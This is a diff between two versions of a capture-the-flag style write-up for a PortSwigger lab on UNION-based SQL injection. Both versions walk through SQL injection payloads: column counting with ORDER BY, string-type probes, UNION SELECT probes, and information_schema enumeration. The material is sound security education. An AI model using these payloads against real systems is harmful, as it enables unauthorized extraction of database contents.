@@ -1,113 +1,99 @@
-# SQL Injection: UNION Attack — Retrieving Data from Other Tables
+# SQL Injection: Pulling Data from Other Tables with a UNION Attack
 
-## PortSwigger Web Security Academy
-
-**Category:** SQL Injection  
-**Lab:** SQL injection UNION attack  
-**Status:** ✅ Solved
+**Lab:** SQL injection UNION attack
+**Status:** Solved ✅
 
 ---
 
-## Lab Description
+## What this lab's testing
 
-This lab contains a SQL injection vulnerability that can be exploited using a `UNION` attack.
-
-The application displays products based on a selected product category. The objective is to use a SQL injection UNION attack to retrieve additional data from the database.
-
-The lab demonstrates how a `UNION` query can be used to combine the results of the original SQL query with the results of another `SELECT` statement.
-
----
-
-## Objective
-
-Use a SQL injection UNION attack to retrieve data from another table in the application's database.
-
----
-
-## Vulnerability
-
-The application uses user-controlled input when constructing a SQL query.
-
-A query may be conceptually similar to:
+This one moves past just breaking a query and into actually pulling data you shouldn't have access to. The app shows products filtered by category, and the underlying query looks something like:
 
 ```sql
 SELECT name, description
 FROM products
 WHERE category = 'Gifts'
+```
 
-Because the category parameter is not safely handled, an attacker can inject additional SQL syntax.
+Because `category` isn't sanitized, we can inject a `UNION SELECT` onto the end of it and get the database to hand back rows from a completely different table — stitched right into the normal product listing.
 
-A UNION operator can then be used to append the results of another query to the original query.
+**Goal:** use a UNION injection to pull data out of another table in the database.
 
-Solution
-Step 1: Identify the Vulnerable Parameter
+## Quick refresher on how UNION works
 
-First, open the PortSwigger lab and browse the product categories.
+`UNION` just glues the results of two `SELECT` statements together:
 
-Select a category and intercept the request using Burp Suite.
+```sql
+SELECT name FROM products
+UNION
+SELECT username FROM users
+```
 
-The request contains a parameter similar to:
+As long as both queries return the same number of columns, with compatible types, the database will happily combine them into one result set. That's the whole trick — get our own `SELECT` to ride along with the app's.
 
+A typical injection looks like:
+
+```
+' UNION SELECT column1,column2--
+```
+
+The leading `'` closes off the string the app was building, `UNION SELECT` bolts on our query, and `--` comments out whatever was supposed to come after in the original statement.
+
+## Working through it
+
+**1. Find the injectable parameter**
+
+Browse the shop, click into a category, and grab the request in Burp. You'll see something like:
+
+```
 category=Gifts
+```
 
-The category parameter is potentially vulnerable to SQL injection.
+That's the parameter we're going after.
 
-Step 2: Send the Request to Burp Repeater
+**2. Send it to Repeater**
 
-Send the intercepted request to Burp Suite Repeater.
+Move the request over so we can iterate on payloads without re-browsing every time.
 
-Repeater allows us to modify the request and test different SQL injection payloads.
+**3. Figure out how many columns we're dealing with**
 
-The original request contains the category parameter:
+Before a UNION injection will work, the injected query has to match the column count of the original one. The easiest way to find that number is with `ORDER BY`:
 
-category=Gifts
-Step 3: Determine the Number of Columns
-
-Before using a UNION SELECT statement, we need to determine how many columns are returned by the original query.
-
-One way to do this is by using:
-
+```
 ' ORDER BY 1--
-
-Then increase the column number:
-
 ' ORDER BY 2--
 ' ORDER BY 3--
+```
 
-Continue increasing the number until the application returns an error.
+Keep bumping the number up until the app throws an error. Whatever the last working number was — that's your column count.
 
-The highest valid column number indicates the number of columns returned by the original query.
+**4. Work out which columns take strings**
 
-Step 4: Determine Compatible Data Types
+Not every column will accept text data, so test that next:
 
-After determining the number of columns, test which columns can contain string values.
-
-For example:
-
+```
 ' UNION SELECT 'a',NULL--
+```
 
-If necessary, test different column positions:
+If that errors out, try shuffling the position:
 
+```
 ' UNION SELECT NULL,'a'--
+```
 
-The response helps identify which columns accept string data.
+Whichever combination the app accepts without complaint tells you which slots you can use to smuggle string data back out.
 
-This is important because the data retrieved from the database must be compatible with the corresponding column data types.
+**5. Confirm the UNION actually lands**
 
-Step 5: Use UNION SELECT
+Once you know the column count and which ones take strings, send something you can visually confirm in the response:
 
-Once the number of columns and compatible data types are known, construct a UNION SELECT payload.
-
-For example:
-
+```
 ' UNION SELECT NULL,'test'--
+```
 
-The exact payload depends on the number of columns returned by the original query.
+The query is now effectively:
 
-The purpose of the payload is to append another SELECT statement to the original SQL query.
-
-Conceptually, the query becomes:
-
+```sql
 SELECT name, description
 FROM products
 WHERE category = 'Gifts'
@@ -115,120 +101,45 @@ WHERE category = 'Gifts'
 UNION
 
 SELECT NULL, 'test'
+```
 
-If the injected value appears in the application response, the UNION attack is working.
+If `test` shows up somewhere in the page, you've got a working UNION injection.
 
-Step 6: Retrieve Database Information
+**6. Start digging into the database itself**
 
-After confirming that the UNION injection works, the database can be queried for additional information.
+With a confirmed injection point, you can start querying the database's own metadata to map out what's there. On databases that support `information_schema`, something like this will list table names:
 
-Depending on the database engine, metadata tables can be used to identify tables and columns.
-
-For example, in databases supporting information_schema, table names can be retrieved using a query similar to:
-
+```sql
 SELECT table_name
 FROM information_schema.tables
+```
 
-The exact query syntax depends on the database management system used by the application.
+(The exact syntax varies a bit depending on which DB engine is behind the scenes.)
 
-Step 7: Retrieve Data from Another Table
+**7. Grab the actual target data**
 
-After identifying an interesting table, its columns can be determined and queried using the UNION injection.
+Once you've spotted an interesting table and worked out its columns, just slot it into the same UNION pattern:
 
-Conceptually:
-
+```sql
 SELECT column1, column2
 FROM target_table
+```
 
-The resulting data is then returned as part of the application's normal response.
+Whatever comes back gets rendered right there in the app's normal response — which is really the whole point of this attack. The vulnerability doesn't just let you break things, it lets you exfiltrate data from anywhere in the database, one query at a time.
 
-This demonstrates that the SQL injection vulnerability allows data from other database tables to be retrieved.
+## Tools used
 
-Understanding the UNION Attack
+- Burp Suite (Proxy + Repeater)
+- Browser
 
-The SQL UNION operator combines the results of two or more SELECT statements.
+## Takeaways
 
-For example:
+- SQL injection isn't limited to the table the query was originally written against — UNION lets you reach into anything the DB user can read.
+- Before a UNION injection works, you need to nail down the column count and matching data types first — skip this and every payload just errors out.
+- `ORDER BY` is a clean, low-noise way to enumerate columns without needing a working UNION yet.
+- Metadata tables like `information_schema.tables` turn a working injection into a full map of the database.
+- Same fix as always: parameterized queries. No amount of input filtering beats just not building SQL out of string concatenation in the first place.
 
-SELECT name FROM products
-UNION
-SELECT username FROM users
+---
 
-If the queries are compatible, the database combines their results.
-
-In a vulnerable web application, an attacker can exploit this behavior by injecting a UNION SELECT statement into a parameter controlled by the user.
-
-Example Injection Structure
-
-A typical UNION injection has the following structure:
-
-' UNION SELECT column1,column2--
-
-The first part:
-
-'
-
-closes the existing SQL string.
-
-The:
-
-UNION SELECT
-
-adds another query to the original query.
-
-The:
-
---
-
-comments out the remaining portion of the original SQL statement.
-
-Burp Suite Workflow
-
-The general workflow used in this lab was:
-
-Browser
-   ↓
-Intercept request
-   ↓
-Burp Suite Proxy
-   ↓
-Send to Repeater
-   ↓
-Identify vulnerable parameter
-   ↓
-Determine number of columns
-   ↓
-Determine compatible data types
-   ↓
-Test UNION SELECT
-   ↓
-Identify database information
-   ↓
-Retrieve data
-Tools Used
-Burp Suite
-Burp Suite Repeater
-Web Browser
-PortSwigger Web Security Academy
-Key Takeaways
-SQL injection can allow an attacker to manipulate backend database queries.
-A UNION attack can combine the results of the original query with another SELECT query.
-The number of columns returned by the original query must be determined before constructing a compatible UNION query.
-The data types of the selected columns must also be compatible.
-Database metadata can sometimes be queried to identify tables and columns.
-Parameterized queries and prepared statements are effective defenses against SQL injection.
-Lab Status
-
-Status: ✅ Solved
-
-Vulnerability: SQL Injection
-
-Technique: UNION-based SQL Injection
-
-Impact: Retrieval of data from other database tables
-
-Disclaimer
-
-This write-up was created for educational and authorized security testing purposes using the PortSwigger Web Security Academy lab environment.
-
-Do not use these techniques against systems without explicit authorization.
+*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't run this against anything you don't have permission to test.*
